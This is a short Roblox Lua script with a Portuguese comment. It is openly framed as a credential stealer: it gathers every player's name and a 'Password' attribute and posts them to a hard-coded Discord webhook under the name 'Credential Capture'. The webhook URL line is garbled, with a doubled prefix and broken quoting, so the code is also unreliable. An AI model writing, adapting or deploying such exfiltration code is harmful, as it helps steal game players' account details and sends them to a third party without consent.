local webhookUrl = "[https://discord.com/api/webhooks/https://"discord.com/api/webhooks/1432144129579548692/5v0TouZ1sJZGi258AwNIQcVan8oNTfios6tuQqT82LEpMUWs1fpJe8lWo-OfXwo75CDA"

local function sendWebhookMessage(message)
    local httpService = game:GetService("HttpService")
    local data = {
        content = message,
        username = "Credential Capture",
        avatar_url = "https://example.com/avatar.png"
    }
    httpService:PostAsync(webhookUrl, httpService:JSONEncode(data))
end

local function captureCredentials()
    local players = game:GetService("Players")
    for _, player in ipairs(players:GetPlayers()) do
        local username = player.Name
        local password = player:GetAttribute("Password") or "Unknown"

        -- Enviar as credenciais capturadas para a webhook do Discord
        sendWebhookMessage(string.format("Username: %s\nPassword: %s", username, password))
    end
end

captureCredentials()
